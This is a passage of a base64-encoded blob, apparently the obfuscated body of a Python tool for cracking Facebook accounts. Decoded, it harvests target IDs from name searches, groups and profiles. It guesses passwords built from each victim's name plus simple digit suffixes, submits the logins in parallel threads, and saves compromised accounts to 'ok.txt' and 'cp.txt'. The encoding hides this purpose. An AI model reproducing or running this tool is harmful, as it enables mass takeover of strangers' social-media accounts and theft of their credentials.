lEIExpbmsgUG9zdGluZycpDQogICAgICAgICAgICAgICAgYWFoaCgnXDAzM1sxOzk3bSBbXDAzM1sxOzkybTAzXDAzM1sxOzk3bV0gQ3JhY2sgRnJvbSBJRCBTZWFyY2ggTmFtZScpDQogICAgICAgICAgICAgICAgYWFoaCgnXDAzM1sxOzk3bSBbXDAzM1sxOzkybTA0XDAzM1sxOzk3bV0gQ3JhY2sgRnJvbSBJRCBHcm91cCAnKQ0KICAgICAgICAgICAgICAgIGFhaGgoJ1wwMzNbMTs5N20gW1wwMzNbMTs5Mm0wNVwwMzNbMTs5N21dIENyYWNrIEZyb20gSUQgUHVibGljayAnKQ0KICAgICAgICAgICAgICAgIGFhaGgoJ1wwMzNbMTs5N20gW1wwMzNbMTs5Mm0wNlwwMzNbMTs5N21dIFZpZXcgQ3JhY2sgUmVzdWx0cycpDQogICAgICAgICAgICAgICAgYWFoaCgnXDAzM1sxOzk3bSBbXDAzM1sxOzkybTA3XDAzM1sxOzk3bV0gRGVsZXRlIENvb2tpZXMnKQ0KICAgICAgICAgICAgICAgIGFhaGgoJ1wwMzNbMTs5N20gW1wwMzNbMTs5MW0wMFwwMzNbMTs5N21dIEV4aXQnKQ0KICAgICAgICAgICAgICAgIHByaW50KCdceDFiWzE7OTRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAJykNCiAgICAgICAgICAgICAgICBtZW1layA9IGlucHV0KCdceDFiWzE7OTdtIFtceDFiWzE7OTRt4oCiXHgxYlsxOzkxbeKAolx4MWJbMTs5N21dIFwwMzNbOTBt4pa6XDAzM1sxOzkzbSAnKQ0KICAgICAgICAgICAgICAgIGlmIG1lbWVrID09ICIiOg0KICAgICAgICAgICAgICAgICAgICBwcmludCgiXG5cblwwMzNbMDBtIFtcMDMzWzkxbSFcMDMzWzAwbV0gV3JvbmcgSW5wdXQhIikNCiAgICAgICAgICAgICAgICAgICAgeWF5YW54ZCgpDQogICAgICAgICAgICAgICAgZWxpZiBtZW1layA9PSAnMCcgb3IgbWVtZWsgPT0gJzAwJzoNCiAgICAgICAgICAgICAgICAgICAgYWFoaCgNCiAgICAgICAgICAgICAgICAgICAgICAgICJcblwwMzNbMTs5Mm0gVGhhbmsgeW91IGZvciB1c2luZyBteSB0b29scy5cbiAgRG9uJ3QgZm9yZ2V0IHRvIExpa2UgdG8gTXkgRmFjZWJvb2sgUGFnZVxuXG4iKQ0KICAgICAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vbS5mYWNlYm9vay5jb20vcGcvQ3liZXIuUE9saWNlLjAwMDAxJykNCiAgICAgICAgICAgICAgICAgICAgZXhpdCgpDQogICAgICAgICAgICAgICAgZWxpZiBtZW1layA9PSAnNycgb3IgbWVtZWsgPT0gJzA3JzoNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlxuXHgxYlsxOzk3bSBbXHgxYlsxOzk2bStceDFiWzE7OTdtXSBceDFiWzE7OTZtUGxlYXNlIFdhaXQuLi4gIikNCiAgICAgICAgICAgICAgICAgICAgYWFoaCgiXHgxYlsxOzkybSDigKIgMTAiKQ0KICAgICAgICAgICAgICAgICAgICBhYWhoKCJceDFiWzE7OTNtIOKAouKAoiAyMCIpDQogICAgICAgICAgICAgICAgICAgIGFhaGgoIlx4MWJbMTs5NG0g4oCi4oCi4oCiIDMwIikNCiAgICAgICAgICAgICAgICAgICAgYWFoaCgiXHgxYlsxOzk1bSDigKLigKLigKLigKIgNDAiKQ0KICAgICAgICAgICAgICAgICAgICBhYWhoKCJceDFiWzE7OTZtIOKAouKAouKAouKAouKAoiA1MCIpDQogICAgICAgICAgICAgICAgICAgIGFhaGgoIlx4MWJbMTs5N20g4oCi4oCi4oCi4oCi4oCi4oCiIDYwIikNCiAgICAgICAgICAgICAgICAgICAgYWFoaCgiXHgxYlsxOzkybSDigKLigKLigKLigKLigKLigKLigKIgNzAiKQ0KICAgICAgICAgICAgICAgICAgICBhYWhoKCJceDFiWzE7OTFtIOKAouKAouKAouKAouKAouKAouKAouKAoiA4MCIpDQogICAgICAgICAgICAgICAgICAgIGFhaGgoIlx4MWJbMTs5Nm0g4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCiIDkwIikNCiAgICAgICAgICAgICAgICAgICAgYWFoaCgiXHgxYlsxOzk0bSDigKLigKLigKLigKLigKLigKLigKLigKLigKLigKIgMTAwJSIpDQogICAgICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgicm0gLXJmIGNvb2tpZXMiKQ0KICAgICAgICAgICAgICAgICAgICBwcmludCgiXG5ceDFiWzE7OTdtIFtceDFiWzE7OTJt4oiaXHgxYlsxOzk3bV1ceDFiWzE7OTJtIERlbGV0ZWQgU3VjY2Vzc2Z1bGx5ISIpDQogICAgICAgICAgICAgICAgICAgIHlheWFueGQoKQ0KICAgICAgICAgICAgICAgIGVsaWYgbWVtZWsgPT0gJzEnIG9yIG1lbWVrID09ICcwMSc6DQogICAgICAgICAgICAgICAgICAgIHVybCA9IHBhcnNlcihzZXMuZ2V0KG1iYXNpYy5mb3JtYXQoJy9tZScpLCBjb29raWVzPWt1a2kpLmNvbnRlbnQsICdodG1sLnBhcnNlcicpLmZpbmQoJ2EnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZz0nVGVtYW4nKQ0KICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IGdldGlkKG1iYXNpYy5mb3JtYXQodXJsWyJocmVmIl0pKQ0KICAgICAgICAgICAgICAgIGVsaWYgbWVtZWsgPT0gJzInIG9yIG1lbWVrID09ICcwMic6DQogICAgICAgICAgICAgICAgICAgIHVzZXJuYW1lID0gaW5wdXQoIlwwMzNbMTs5N21cbiBbXDAzM1sxOzk2bT9cMDMzWzE7OTdtXSBMaW5rIFBvc3QgXDAzM1sxOzkxbTogXDAzM1sxOzkybSIpDQogICAgICAgICAgICAgICAgICAgIGlmIHVzZXJuYW1lID09ICIiOg0KICAgICAgICAgICAgICAgICAgICAgICAgZXhpdCgiXDAzM1swMG1bXDAzM1s5MW0hXDAzM1swMG1dIENhbm5vdCBiZSBlbXB0eSEiKQ0KICAgICAgICAgICAgICAgICAgICBlbGlmICd3d3cuZmFjZWJvb2snIGluIHVzZXJuYW1lOg0KICAgICAgICAgICAgICAgICAgICAgICAgdXNlcm5hbWUgPSB1c2VybmFtZS5yZXBsYWNlKCd3d3cuZmFjZWJvb2snLCAnbWJhc2ljLmZhY2Vib29rJykNCiAgICAgICAgICAgICAgICAgICAgZWxpZiAnd3d3LmZhY2Vib29rJyBpbiB1c2VybmFtZToNCiAgICAgICAgICAgICAgICAgICAgICAgIHVzZXJuYW1lID0gdXNlcm5hbWUucmVwbGFjZSgnbS5mYWNlYm9vaycsICdtYmFzaWMuZmFjZWJvb2suY29tJykNCiAgICAgICAgICAgICAgICAgICAgdXNlcm5hbWUgPSBmcm9tbGlrZXModXNlcm5hbWUpDQogICAgICAgICAgICAgICAgZWxpZiBtZW1layA9PSAnMycgb3IgbWVtZWsgPT0gJzAzJzoNCiAgICAgICAgICAgICAgICAgICAga25mID0gaW5wdXQoDQogICAgICAgICAgICAgICAgICAgICAgICAiXDAzM1sxOzk3bVxuIFtcMDMzWzE7OTZtP1wwMzNbMTs5N21dIFRoZSBOYW1lIFlvdSBXYW50IFRvIFNlYXJjaCBGb3IgXDAzM1sxOzkxbTogXDAzM1sxOzkybSIpDQogICAgICAgICAgICAgICAgICAgIHVzZXJuYW1lID0gYnlzZWFyY2gobWJhc2ljLmZvcm1hdCgnL3NlYXJjaC9wZW9wbGUvP3E9JyArIGtuZikpDQogICAgICAgICAgICAgICAgICAgIGlmIGxlbih1c2VybmFtZSkgPT0gMDoNCiAgICAgICAgICAgICAgICAgICAgICAgIGV4aXQoIlwwMzNbOTBtW1wwMzNbOTFtIVwwMzNbOTBtXSBObyBOYW1lISIpDQogICAgICAgICAgICAgICAgZWxpZiBtZW1layA9PSAnNCcgb3IgbWVtZWsgPT0gJzA0JzoNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTs5N21cbiBbXDAzM1sxOzk0beKAolwwMzNbMTs5N21dIENhbiBPbmx5IFRha2UgXDAzM1s5MW0xMDAgXDAzM1swMG1JRCAiKQ0KICAgICAgICAgICAgICAgICAgICBncmFiID0gaW5wdXQoIlwwMzNbMTs5N21bXDAzM1sxOzk2bT9cMDMzWzE7OTdtXSBcMDMzWzAwbUlEIGdyb3VwIFwwMzNbMTs5MW06IFwwMzNbMTs5Mm0iKQ0KICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IGdydWJpZChtYmFzaWMuZm9ybWF0KCIvYnJvd3NlL2dyb3VwL21lbWJlcnMvP2lkPSIgKyBncmFiKSkNCiAgICAgICAgICAgICAgICAgICAgaWYgbGVuKHVzZXJuYW1lKSA9PSAwOg0KICAgICAgICAgICAgICAgICAgICAgICAgZXhpdCgiXDAzM1swMG1bXDAzM1s5MW0hXDAzM1swMG1dIEdyb3VwIElEIE5vbmUhIikNCiAgICAgICAgICAgICAgICBlbGlmIG1lbWVrID09ICc1JyBvciBtZW1layA9PSAnMDUnOg0KICAgICAgICAgICAgICAgICAgICBrbmYgPSBpbnB1dCgiXDAzM1sxOzk3bVxuIFtcMDMzWzE7OTZtP1wwMzNbMTs5N21dIFVzZXJuYW1lL0lkIFwwMzNbMTs5MW06IFwwMzNbMTs5Mm0iKQ0KICAgICAgICAgICAgICAgICAgICBpZiBrbmYuaXNkaWdpdCgpOg0KICAgICAgICAgICAgICAgICAgICAgICAgdXNlciA9ICIvcHJvZmlsZS5waHA/aWQ9IiArIGtuZg0KICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgdXNlciA9ICIvIiArIGtuZg0KICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICB1c2VyID0gcGFyc2VyKHJlcXVlc3RzLmdldChtYmFzaWMuZm9ybWF0KHVzZXIpLCBjb29raWVzPWt1a2kpLmNvbnRlbnQsICJodG1sLnBhcnNlciIpLmZpbmQoJ2EnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZz0iVGVtYW4iKVsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiaHJlZiJdDQogICAgICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IGdldGlkKG1iYXNpYy5mb3JtYXQodXNlcikpDQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBUeXBlRXJyb3I6DQogICAgICAgICAgICAgICAgICAgICAgICBleGl0KCJcMDMzWzAwbVtcMDMzWzkxbSFcMDMzWzAwbV0gXDAzM1s5N21Vc2VyL0lEIFdyb25nISIpDQogICAgICAgICAgICAgICAgZWxpZiBtZW1layA9PSAnNicgb3IgbWVtZWsgPT0gJzA2JzoNCiAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgZmlsZTEgPSBvcGVuKCJjcC50eHQiKS5yZWFkKCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGZpbGUyID0gb3Blbigib2sudHh0IikucmVhZCgpDQogICAgICAgICAgICAgICAgICAgICAgICBhID0gZmlsZTEgKyBmaWxlMg0KICAgICAgICAgICAgICAgICAgICAgICAgZmluYWwgPSBhLnN0cmlwKCkuc3BsaXQoIlxuIikNCiAgICAgICAgICAgICAgICAgICAgICAgIGZpbmFsID0gc2V0KGZpbmFsKQ0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJcMDMzWzk3bVxuIFtcMDMzWzkzbXtzdHIobGVuKGZpbmFsKSl9XDAzM1s5N21dIEFjY291bnQgVG8gQ2hlY2sgIikNCiAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPTEwKSBhcyBleDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgdXNlciBpbiBmaW5hbDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYSA9IHVzZXIuc3BsaXQoInwiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleC5zdWJtaXQobG9naW4sIChhWzBdKSwgKGFbMV0pLCAoVHJ1ZSkpDQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgeCBpbiByZXN1bHQ6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKCdvay50eHQnLCAnYScpIGFzIGY6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYud3JpdGUoeCArICdcbicpDQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgeCBpbiBjaGVrOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbignY3AudHh0JywgJ2EnKSBhcyBmOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmLndyaXRlKHggKyAiXG4iKQ0KDQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiXG5ceDFiWzE7OTdtW1x4MWJbMTs5NG3igKJceDFiWzE7OTdtXSBDcmFjayBEb25lLi4uLiIpDQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiXHgxYlsxOzk3bVtceDFiWzE7OTRt4pyTXHgxYlsxOzk3bV0gU2F2ZWQgVG8gXDAzM1sxOzkzbWNwLnR4dFwwMzNbOTZtfFwwMzNbMTs5Mm1vay50eHQiKQ0KICAgICAgICAgICAgICAgICAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6DQogICAgICAgICAgICAgICAgICAgICAgICBleGl0KCJcblwwMzNbMDBtW1wwMzNbOTFtIVwwMzNbMDBtXSBZb3UgRGlkbid0IEdldCBSZXN1bHRzIikNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICBwcmludCgiXG5cbiBcMDMzWzAwbVtcMDMzWzkxbSFcMDMzWzAwbV0gV3JvbmcgSW5wdXQhIikNCiAgICAgICAgICAgICAgICAgICAgeWF5YW54ZCgpDQogICAgICAgICAgICAgICAgcHJpbnQoKQ0KICAgICAgICAgICAgICAgIGlrZWhfaWtlaF9raW1vY2hpKCkNCiAgICAgICAgICAgICAgICBqZW1idXQoKQ0KICAgICAgICAgICAgICAgIHByaW50KCdcblx4MWJbMTs5Nm0gICAgICAgIOKcsOKYheKcsOKVreKNneKVruKOndKC4pqG4o+d4pqG4o2A4o6g4pWt4o2d4pWu4pyw4piF4pywJykNCiAgICAgICAgICAgICAgICBwcmludCgnXHgxYlsxOzk1bSAgICAg55aK4pWU4pWQ4pWm4pWQ4pSA4pSA4pSA4pSA4oCi4oCi4pm94oCi4oCi4pSA4pSA4pSA4pSA4pSA4pWQ4pWm4pWQ4pWX55aKJykNCiAgICAgICAgICAgICAgICBwcmludCgnXHgxYlsxOzk3bSAgICAgICAgICAgVG90YWwgSURceDFiWzE7OTFtIDpceDFiWzE7OTJtICcgKyBzdHIoDQogICAgICAgICAgICAgICAgICAgIGxlbihpZCkpICsgIlxuXHgxYlsxOzk1bSAgICAg55aK4pWa4pWQ4pWp4pWQ4pSA4pSA4pSA4pSA4oCi4oCi4pm94oCi4oCi4pSA4pSA4pSA4pSA4pSA4pWQ4pWp4pWQ4pWd55aKXG4iLCBlbmQ9IiIpDQogICAgICAgICAgICAgICAgZXhwYXNzID0gaW5wdXQoIlxuXDAzM1sxOzk3bSBbXDAzM1sxOzk2bT9cMDMzWzE7OTdtXSBBZGQgUGFzc3dvcmQxIFwwMzNbMTs5MW06IFwwMzNbMTs5Mm0iKQ0KICAgICAgICAgICAgICAgIGV4cGFzcyA9IGlucHV0KCJcMDMzWzE7OTdtIFtcMDMzWzE7OTZtP1wwMzNbMTs5N21dIEFkZCBQYXNzd29yZDIgXDAzM1sxOzkxbTogXDAzM1sxOzkybSIpDQogICAgICAgICAgICAgICAgZXhwYXNzID0gaW5wdXQoIlwwMzNbMTs5N20gW1wwMzNbMTs5Nm0/XDAzM1sxOzk3bV0gQWRkIFBhc3N3b3JkMyBcMDMzWzE7OTFtOiBcMDMzWzE7OTJtIikNCiAgICAgICAgICAgICAgICBhYWhoKCdceDFiWzE7OTRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXG4nKQ0KICAgICAgICAgICAgICAgIGlrZWhfaWtlaF9raW1vY2hpKCkNCiAgICAgICAgICAgICAgICBqZW1idXQoKQ0KICAgICAgICAgICAgICAgIHByaW50KCdcblx4MWJbMTs5Mm0gICAgICAgIOKcsOKYheKcsOKVreKNneKVruKOndKC4pqG4o+d4pqG4o2A4o6g4pWt4o2d4pWu4pyw4piF4pywJykNCiAgICAgICAgICAgICAgICBwcmludCgnXHgxYlsxOzk3bSAgICAg55aK4pWU4pWQ4pWm4pWQ4pSA4pSA4pSA4pSA4oCi4oCi4pm94oCi4oCi4pSA4pSA4pSA4pSA4pSA4pWQ4pWm4pWQ4pWX55aKJykNCiAgICAgICAgICAgICAgICBwcmludCgnXHgxYlsxOzk2bSAgICAgICAgICAgVG90YWwgSURceDFiWzE7OTFtIDpceDFiWzE7OTRtICcgKyBzdHIoDQogICAgICAgICAgICAgICAgICAgIGxlbihpZCkpICsgIlxuXHgxYlsxOzk3bSAgICAg55aK4pWa4pWQ4pWp4pWQ4pSA4pSA4pSA4pSA4oCi4oCi4pm94oCi4oCi4pSA4pSA4pSA4pSA4pSA4pWQ4pWp4pWQ4pWd55aKXG4iLCBlbmQ9IiIpDQogICAgICAgICAgICAgICAgcHJpbnQoDQogICAgICAgICAgICAgICAgICAgICdcblx4MWJbMTs5N20gW1x4MWJbMTs5Mm0rXHgxYlsxOzk3bV0gdGhlIHJlc3VsdFx4MWJbMTs5Mm0gT0tceDFiWzE7OTdtIHNhdmVkIHRvIDogb2sudHh0XG4gW1x4MWJbMTs5M20tXHgxYlsxOzk3bV0gdGhlIHJlc3VsdFx4MWJbMTs5M20gQ1BceDFiWzE7OTdtIHNhdmVkIHRvIDogY3AudHh0JykNCiAgICAgICAgICAgICAgICBwcmludCgnXG4gW1x4MWJbMTs5MW0hXHgxYlsxOzk3bV0gdHVybiBvZmYgZGF0YSB0byBzdG9wIHRoZSBwcm9jZXNzXG4nKQ0KICAgICAgICAgICAgICAgIHdpdGggVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPTMwKSBhcyBleDoNCiAgICAgICAgICAgICAgICAgICAgZm9yIHVzZXIgaW4gdXNlcm5hbWU6DQogICAgICAgICAgICAgICAgICAgICAgICB1c2VycyA9IHVzZXIuc3BsaXQoJ3wnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgc3MgPSB1c2Vyc1swXS5zcGxpdCgnICcpDQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgeCBpbiBzczoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaXN0cGFzcyA9IFsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyKHgpICsgJzEyMycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cih4KSArICcxMjM0JywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyKHgpICsgJzEyMzQ1JywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyKHgpICsgJzEyMzQ1NicsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpc3RwYXNzLmFwcGVuZChleHBhc3MpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHBhc3N3IGluIHNldChsaXN0cGFzcyk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4LnN1Ym1pdChsb2dpbiwgKHVzZXJzWzFdKSwgKHBhc3N3KSkNCiAgICAgICAgICAgICAgICBpZiBjaGVjayAhPSAwIG9yIHJlc3VsdCAhPSAwOg0KICAgICAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDAuMSkNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlxuXG5ceDFiWzE7OTJtICAqXHgxYlsxOzk3bSBmaW5pc2hlZC4iKQ0KDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlxuXG5ceDFiWzE7OTZtICAqXHgxYlsxOzk3bSB5b3UgZ290IG5vIHJlc3VsdHM6KCIpDQogICAgICAgICAgICBleGNlcHQgKEtleWJvYXJkSW50ZXJydXB0LCBFT0ZFcnJvcik6DQogICAgICAgICAgICAgICAgZXhpdCgpDQogICAgICAgICAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQogICAgICAgICAgICAgICAgZXhpdCgiXG5cblwwMzNbMDBtICBbXDAzM1s5MW0hXDAzM1swMG1dIG5vIENvbm5lY3Rpb24iKQ0KDQogICAgZWxpZiB5YXlhbiA9PSAiMiIgb3IgeWF5YW4gPT0gIjAyIjoNCiAgICAgICAgb3Muc3lzdGVtKCJ4ZGctb3BlbiBodHRwczovL20uZmFjZWJvb2suY29tL3BnL0N5YmVyLlBPbGljZS4wMDAwMSIpDQogICAgICAgIHlheWFueGQoKQ0KICAgIGVsaWYgeWF5YW4gPT0gIjMiIG9yIHlheWFuID09ICIwMyI6DQogICAgICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly9tLmZhY2Vib29rLmNvbS9wZy9DeWJlci5QT2xpY2UuMDAwMDEnKQ0KICAgICAgICB5YXlhbnhkKCkNCiAgICBlbGlmIHlheWFuID09ICI0IiBvciB5YXlhbiA9PSAiMDQiOg0KICAgICAgICBvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vbS5mYWNlYm9vay5jb20vcGcvQ3liZXIuUE9saWNlLjAwMDAxJykNCiAgICAgICAgeWF5YW54ZCgpDQogICAgZWxpZiB5YXlhbiA9PSAiNSIgb3IgeWF5YW4gPT0gIjA1IjoNCiAgICAgICAgcHJpbnQoIlxuXG5ceDFiWzE7OTdtICAgICAgWyBceDFiWzE7OTJtUGxlYXNlIFdhaXQgV2hpbGUgVXBkYXRpbmcgVGhlIFRvb2xzIFx4MWJbMTs5N21dXG4iKQ0KICAgICAgICBvcy5zeXN0ZW0oImdpdCBwdWxsIikNCiAgICAgICAgcHJpbnQoIlxuIFx4MWJbMTs5N21bXHgxYlsxOzkybeKImlx4MWJbMTs5N21dXHgxYlsxOzkybSBTdWNjZXNzZnVsbHkgVXBkYXRlZCFcbiAiKQ0KICAgICAgICB5YXlhbnhkKCkNCiAgICBlbGlmIHlheWFuID09ICIwIiBvciB5YXlhbiA9PSAiMDAiOg0KICAgICAgICBhYWhoKCJcblwwMzNbMTs5Mm0gVGhhbmsgeW91IGZvciB1c2luZyBteSB0b29scy5cbiAgRG9uJ3QgZm9yZ2V0IHRvIExpa2UgTXkgRmFjZWJvayBQYWdlXG5cbiIpDQogICAgICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly9tLmZhY2Vib29rLmNvbS9wZy9DeWJlci5QT2xpY2UuMDAwMDEnKQ0KICAgICAgICBleGl0KCkNCg0KDQppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOg0KICAgIGlrZWhfaWtlaF9raW1vY2hpKCkNCiAgICBjcm9vdCgpDQogICAgaWtlaF9pa2VoX2tpbW9jaGkoKQ0KICAgIGtvbnRvbCgpDQogICAgbW9jaF95YXlhbigpDQogICAgeWF5YW54ZCgpDQo="))